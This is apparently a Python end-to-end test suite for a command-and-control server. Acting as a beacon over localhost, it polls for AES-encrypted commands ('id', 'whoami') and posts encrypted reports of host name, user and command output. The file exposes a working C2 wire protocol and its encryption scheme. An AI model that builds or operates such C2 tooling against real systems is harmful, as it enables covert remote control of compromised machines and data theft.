"""
End-to-end test: a real HTTP/1.1 client talks to a real
TCP socket bound by server.serve(), and the full crypto
roundtrip works.

This catches the wire-format mismatch that bit us before:
the beacon speaks HTTP/1.1 (libcurl), the server used to
expect a raw Gopher selector. They could not talk.

We use a free port, run the server in a daemon thread,
and drive it with raw sockets — no libcurl, no real
network loopback surprises.
"""
import base64
import json
import os
import socket
import sys
import tempfile
import threading
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "include"))
sys.path.insert(0, str(ROOT))

from c2 import server  # noqa: E402


KEY = bytes.fromhex("0123456789abcdef" * 4)
CFG = {
    "host": "127.0.0.1",
    "port": 0,  # not used; we override below
    "uri": "/api/poll/",
    "report_uri": "/report/",
    "aes_key": KEY,
    "log_dir": "",
    "upload_dir": "",
}


def _free_port() -> int:
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


def _recv_response(sock: socket.socket, timeout=3) -> bytes:
    sock.settimeout(timeout)
    buf = b""
    while True:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        buf += chunk
    return buf


def test_http_get_poll_returns_encrypted_command():
    """Beacon-style HTTP/1.1 GET /<uri>/<id> must return a base64
    body the server can encrypt and we can decrypt with the shared
    AES key. Before the fix, the server returned iUNKNOWN_SELECTOR."""
    port = _free_port()
    cfg = dict(CFG)
    cfg["port"] = port
    tmp = Path(tempfile.mkdtemp())
    cfg["log_dir"] = str(tmp / "logs")
    cfg["upload_dir"] = str(tmp / "uploads")
    state = server.C2State(cfg)
    state.commands["linux"] = "id"

    t = threading.Thread(target=server.serve, args=(cfg, state), daemon=True)
    t.start()
    time.sleep(0.5)
    # health check
    probe = socket.socket()
    probe.settimeout(2)
    try:
        probe.connect(("127.0.0.1", port))
        probe.sendall(b"GET /healthz HTTP/1.1\r\nHost: x\r\n\r\n")
        probe.recv(1024)
    except Exception:
        time.sleep(0.3)
    finally:
        probe.close()

    try:
        s = socket.socket()
        s.connect(("127.0.0.1", port))
        s.sendall(b"GET /api/poll/linux HTTP/1.1\r\nHost: x\r\nUser-Agent: bsb-beacon\r\nAccept: */*\r\n\r\n")
        resp = _recv_response(s)
        s.close()
    finally:
        # server is a daemon thread, will die with us
        pass

    assert resp.startswith(b"HTTP/1.1 200 OK"), f"bad status: {resp[:80]!r}"
    body = resp.partition(b"\r\n\r\n")[2].strip()
    assert body, f"empty body in {resp!r}"
    raw = base64.b64decode(body)
    iv, ct = raw[:16], raw[16:]
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
    pt = Cipher(algorithms.AES(KEY), modes.CFB(iv), backend=default_backend()).decryptor()
    decoded = pt.update(ct) + pt.finalize()
    assert decoded == b"id", f"decrypted {decoded!r} != b'id'"


def test_http_post_report_writes_log():
    """Beacon-style HTTP/1.1 POST /report/<b64> must reach the
    report handler, decrypt, parse, and write a CSV row. Before
    the fix, the POST went to the same URL as the GET (poll),
    so the server logged an UNKNOWN_SELECTOR error and the
    CSV never had a row for this client."""
    import tempfile
    port = _free_port()
    cfg = dict(CFG)
    cfg["port"] = port
    tmp = Path(tempfile.mkdtemp())
    cfg["log_dir"] = str(tmp / "logs")
    cfg["upload_dir"] = str(tmp / "uploads")
    state = server.C2State(cfg)

    t = threading.Thread(target=server.serve, args=(cfg, state), daemon=True)
    t.start()
    time.sleep(0.5)
    # health check
    probe = socket.socket()
    probe.settimeout(2)
    try:
        probe.connect(("127.0.0.1", port))
        probe.sendall(b"GET /healthz HTTP/1.1\r\nHost: x\r\n\r\n")
        probe.recv(1024)
    except Exception:
        time.sleep(0.3)
    finally:
        probe.close()

    report = {
        "client": "linux", "os": "linux", "pid": 4242, "hostname": "e2e",
        "ips": "127.0.0.1", "user": "root",
        "command": "id", "output": "uid=0(root) gid=0(root)",
    }
    payload = json.dumps(report).encode()
    iv = os.urandom(16)
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
    enc = Cipher(algorithms.AES(KEY), modes.CFB(iv), backend=default_backend()).encryptor()
    ct = enc.update(payload) + enc.finalize()
    b64 = base64.b64encode(iv + ct).decode()

    try:
        s = socket.socket()
        s.connect(("127.0.0.1", port))
        req = (
            f"POST /report/{b64} HTTP/1.1\r\n"
            f"Host: x\r\nUser-Agent: bsb-beacon\r\n"
            f"Content-Length: 0\r\n\r\n"
        )
        s.sendall(req.encode())
        resp = _recv_response(s)
        s.close()
    finally:
        pass

    assert resp.startswith(b"HTTP/1.1 200 OK"), f"bad status: {resp[:80]!r}"
    body = resp.partition(b"\r\n\r\n")[2].strip()
    assert body == b"OK", f"body: {body!r}"

    log = Path(cfg["log_dir"]) / "linux.log"
    assert log.exists(), f"log not created at {log}"
    text = log.read_text()
    assert "uid=0(root)" in text, f"report not in log: {text!r}"
    assert "4242" in text, f"pid not in log: {text!r}"


def test_gopher_legacy_still_works():
    """The old Gopher-style selector (single line, CRLF) must
    still dispatch correctly — server.py keeps that path so
    anything that depended on it is not broken by the new
    HTTP/1.1 entry point."""
    import tempfile
    port = _free_port()
    cfg = dict(CFG)
    cfg["port"] = port
    tmp = Path(tempfile.mkdtemp())
    cfg["log_dir"] = str(tmp / "logs")
    cfg["upload_dir"] = str(tmp / "uploads")
    state = server.C2State(cfg)
    state.commands["legacy"] = "whoami"

    t = threading.Thread(target=server.serve, args=(cfg, state), daemon=True)
    t.start()
    time.sleep(0.5)
    # health check
    probe = socket.socket()
    probe.settimeout(2)
    try:
        probe.connect(("127.0.0.1", port))
        probe.sendall(b"GET /healthz HTTP/1.1\r\nHost: x\r\n\r\n")
        probe.recv(1024)
    except Exception:
        time.sleep(0.3)
    finally:
        probe.close()

    try:
        s = socket.socket()
        s.connect(("127.0.0.1", port))
        s.sendall(b"/api/poll/legacy\r\n")
        resp = _recv_response(s)
        s.close()
    finally:
        pass

    # Legacy path returns raw base64 + CRLF, no HTTP headers.
    body = resp.strip()
    raw = base64.b64decode(body)
    iv, ct = raw[:16], raw[16:]
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
    dec = Cipher(algorithms.AES(KEY), modes.CFB(iv), backend=default_backend()).decryptor()
    decoded = dec.update(ct) + dec.finalize()
    assert decoded == b"whoami", f"decoded {decoded!r} != b'whoami'"


def test_http_post_with_url_encoded_b64_payload():
    """The beacon percent-encodes the base64 payload before
    splicing it onto the URL path. Standard base64 uses '+',
    '/', and '=' which would otherwise produce an invalid
    HTTP request line (extra '/' would split the path, '+'
    is space-encoded, '=' is a query marker). This test
    replicates that: encode the payload exactly as the
    beacon does, send it, and assert the report is decrypted
    and logged."""
    import tempfile
    port = _free_port()
    cfg = dict(CFG)
    cfg["port"] = port
    tmp = Path(tempfile.mkdtemp())
    cfg["log_dir"] = str(tmp / "logs")
    cfg["upload_dir"] = str(tmp / "uploads")
    state = server.C2State(cfg)

    t = threading.Thread(target=server.serve, args=(cfg, state), daemon=True)
    t.start()
    time.sleep(0.5)
    # health check
    probe = socket.socket()
    probe.settimeout(2)
    try:
        probe.connect(("127.0.0.1", port))
        probe.sendall(b"GET /healthz HTTP/1.1\r\nHost: x\r\n\r\n")
        probe.recv(1024)
    except Exception:
        time.sleep(0.3)
    finally:
        probe.close()

    # Build a payload whose base64 is GUARANTEED to contain
    # all three "unsafe" chars: '+', '/', and '='.
    raw = bytes([0xFB, 0xFF, 0xFE] * 12)  # 36 bytes, base64 will have /+= chars
    b64 = base64.b64encode(raw).decode()
    assert "+" in b64 or "/" in b64 or "=" in b64, f"b64 missing unsafe chars: {b64!r}"

    # Percent-encode the b64 the same way the beacon does
    # (any char outside [A-Za-z0-9-_.~] becomes %XX).
    def encode(s):
        out = []
        for ch in s.encode("ascii"):
            c = bytes([ch])
            if (b"A" <= c <= b"Z") or (b"a" <= c <= b"z") or (b"0" <= c <= b"9") \
                    or c in b"-_.~":
                out.append(chr(ch))
            else:
                out.append(f"%{ch:02X}")
        return "".join(out)
    b64_enc = encode(b64)

    # Encrypt the report with the standard key
    report = {"client": "urlenc", "os": "linux", "pid": 31337, "hostname": "enc",
              "ips": "127.0.0.1", "user": "x", "command": "id",
              "output": "URL-encoded payload roundtrip OK"}
    payload = json.dumps(report).encode()
    iv = os.urandom(16)
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
    enc = Cipher(algorithms.AES(KEY), modes.CFB(iv), backend=default_backend()).encryptor()
    ct = enc.update(payload) + enc.finalize()
    # Re-encrypt the IV+ct into a base64 (b64 may contain unsafe chars)
    b64_payload = base64.b64encode(iv + ct).decode()
    # The b64_payload is the string that goes in the URL. Encode it.
    b64_payload_enc = encode(b64_payload)

    try:
        s = socket.socket()
        s.connect(("127.0.0.1", port))
        req = (
            f"POST /report/{b64_payload_enc} HTTP/1.1\r\n"
            f"Host: x\r\nUser-Agent: bsb-beacon\r\n"
            f"Content-Length: 0\r\n\r\n"
        )
        s.sendall(req.encode())
        resp = _recv_response(s)
        s.close()
    finally:
        pass

    assert resp.startswith(b"HTTP/1.1 200 OK"), f"bad status: {resp[:80]!r}"
    body = resp.partition(b"\r\n\r\n")[2].strip()
    assert body == b"OK", f"body: {body!r} (url-encoded payload not decoded)"

    log = Path(cfg["log_dir"]) / "urlenc.log"
    assert log.exists(), f"log not created at {log}"
    text = log.read_text()
    assert "URL-encoded payload roundtrip OK" in text, f"report not in log: {text!r}"
    assert "31337" in text, f"pid not in log: {text!r}"


def test_fragmented_post_is_dispatched_as_http():
    """When the client sends a long POST URL that crosses a TCP
    segment boundary, the first recv() inside server.serve() may
    not include "HTTP/1.1" yet. Before the _read_http_request
    fix, this made the dispatcher fall through to the legacy
    Gopher branch and return iUNKNOWN_SELECTOR. We reproduce that
    fragmentation here by sending the request in two pieces with
    a small delay between them. The expected behavior is that the
    server still parses the full request, decrypts, and writes
    the log line."""
    import tempfile
    port = _free_port()
    cfg = dict(CFG)
    cfg["port"] = port
    tmp = Path(tempfile.mkdtemp())
    cfg["log_dir"] = str(tmp / "logs")
    cfg["upload_dir"] = str(tmp / "uploads")
    state = server.C2State(cfg)

    t = threading.Thread(target=server.serve, args=(cfg, state), daemon=True)
    t.start()
    time.sleep(0.5)
    # health check
    probe = socket.socket()
    probe.settimeout(2)
    try:
        probe.connect(("127.0.0.1", port))
        probe.sendall(b"GET /healthz HTTP/1.1\r\nHost: x\r\n\r\n")
        probe.recv(1024)
    except Exception:
        time.sleep(0.3)
    finally:
        probe.close()

    report = {
        "client": "frag", "os": "linux", "pid": 7, "hostname": "frag",
        "ips": "127.0.0.1", "user": "x",
        "command": "ls", "output": "fragmented OK",
    }
    payload = json.dumps(report).encode()
    iv = os.urandom(16)
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
    enc = Cipher(algorithms.AES(KEY), modes.CFB(iv), backend=default_backend()).encryptor()
    ct = enc.update(payload) + enc.finalize()
    b64 = base64.b64encode(iv + ct).decode()

    req = (
        f"POST /report/{b64} HTTP/1.1\r\n"
        f"Host: x\r\nUser-Agent: bsb-beacon\r\n"
        f"Content-Length: 0\r\n\r\n"
    ).encode()

    # Split roughly in the middle of the request line so the
    # first recv() does not see "HTTP/1.1".
    mid = len(req) // 2
    s = socket.socket()
    s.connect(("127.0.0.1", port))
    s.sendall(req[:mid])
    time.sleep(0.15)
    s.sendall(req[mid:])
    resp = _recv_response(s)
    s.close()

    assert resp.startswith(b"HTTP/1.1 200 OK"), f"bad status: {resp[:80]!r}"
    body = resp.partition(b"\r\n\r\n")[2].strip()
    assert body == b"OK", f"body: {body!r} (fragmented request was misrouted)"

    log = Path(cfg["log_dir"]) / "frag.log"
    assert log.exists(), f"log not created at {log}"
    assert "fragmented OK" in log.read_text(), "report not in log"


def main():
    fails = []
    for name, fn in list(globals().items()):
        if name.startswith("test_") and callable(fn):
            try:
                print(f"[{name}]")
                fn()
                print(f"PASS {name}")
            except AssertionError as e:
                fails.append((name, str(e)))
                print(f"FAIL {name}: {e}")
            except Exception as e:
                fails.append((name, repr(e)))
                print(f"ERROR {name}: {e!r}")
    if fails:
        sys.exit(1)
    print("\nAll C2 HTTP E2E tests passed")


if __name__ == "__main__":
    main()
